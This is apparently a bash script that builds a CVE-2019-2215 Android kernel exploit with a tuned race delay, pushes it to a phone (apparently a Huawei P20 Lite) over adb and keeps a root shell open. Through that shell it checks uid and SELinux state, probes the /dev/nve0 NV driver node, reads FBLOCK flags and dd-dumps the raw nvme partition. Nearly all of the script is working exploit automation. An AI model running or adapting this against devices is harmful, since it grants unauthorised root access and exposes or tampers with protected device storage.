#!/bin/bash
# Get root with the PRISTINE exploit (proven to win the race at DELAY=25),
# then test whether the NV driver node is reachable without any SELinux work.
set -u
cd /home/placeless/dev/p20lite-cve
NDK=$(ls -d ~/Android/Sdk/ndk/*/ 2>/dev/null | head -1)
IN=/tmp/root.in
OUT=/tmp/root.out

echo "############ 1. revert the exploit to pristine and pin DELAY=25"
git checkout -- exploit/cve_2019_2215.c exploit/include/kernel_specific.h
python3 - <<'PY'
import re
p='/home/placeless/dev/p20lite-cve/exploit/include/cve_2019_2215.h'
s=open(p).read()
open(p,'w').write(re.sub(r'#define DELAY \d+u', '#define DELAY 25u', s))
PY
grep -n "define DELAY" exploit/include/cve_2019_2215.h

${NDK}ndk-build -j4 NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk \
    APP_PLATFORM=android-28 APP_ABI=arm64-v8a 2>&1 | tail -2

echo
echo "############ 2. push exploit + nvme tool"
timeout 60 adb push libs/arm64-v8a/cve-2019-2215 /data/local/tmp/cve-2019-2215 2>&1 | tail -1
timeout 60 adb push /home/placeless/dev/hisi-nve/libs/arm64-v8a/hisi-nve /data/local/tmp/hisi-nve 2>&1 | tail -1
timeout 30 adb shell 'chmod 755 /data/local/tmp/cve-2019-2215 /data/local/tmp/hisi-nve; ls -la /data/local/tmp/ | grep -E "cve|hisi"'

echo
echo "############ 3. start a persistent root shell"
rm -f "$IN" "$OUT"; mkfifo "$IN"; : > "$OUT"
adb shell /data/local/tmp/cve-2019-2215 < "$IN" >> "$OUT" 2>&1 &
EXPPID=$!
exec 9> "$IN"
for i in $(seq 1 120); do
  grep -q "capabilities are overwritten" "$OUT" 2>/dev/null && { echo "  exploit reached root after ${i}s"; break; }
  sleep 1
done
if ! grep -q "capabilities are overwritten" "$OUT" 2>/dev/null; then
  echo ">>> exploit did not reach root this attempt; tail:"; tail -6 "$OUT"; exit 1
fi
# give execute_sh() a moment to hand over the shell
sleep 3

runroot() {
  local MARK="MK$RANDOM$RANDOM" b
  b=$(wc -c < "$OUT")
  printf 'echo %s\n%s\necho %s\n' "$MARK" "$1" "$MARK" > "$IN"
  for i in $(seq 1 60); do
    sleep 1
    [ "$(tail -c +$((b+1)) "$OUT" | grep -c "^$MARK$")" -ge 2 ] && break
  done
  tail -c +$((b+1)) "$OUT" | awk -v m="$MARK" 'BEGIN{n=0}{if($0==m){n++;next} if(n==1)print}'
}

echo
echo "############ 4. what are we (uid + domain)"
runroot 'id; cat /proc/self/attr/current; getenforce'

echo
echo "############ 5. THE QUESTION: is the NV driver node reachable?"
runroot 'ls -la /dev/nve0 2>&1; echo "---"; ls -laZ /dev/nve0 2>&1 | head -2'

echo
echo "############ 6. try reading the FBLOCK flags as-is"
runroot '/data/local/tmp/hisi-nve r FBLOCK 2>&1 | head -12'

echo
echo "############ 7. and the raw partition"
runroot 'dd if=/dev/block/bootdevice/by-name/nvme of=/data/local/tmp/p20test.img bs=512 count=2 2>&1; ls -la /data/local/tmp/p20test.img 2>&1'

echo
echo "### session left open; kill this script to end"
while kill -0 "$EXPPID" 2>/dev/null; do sleep 5; done
echo "### exploit exited"
exec 9>&-
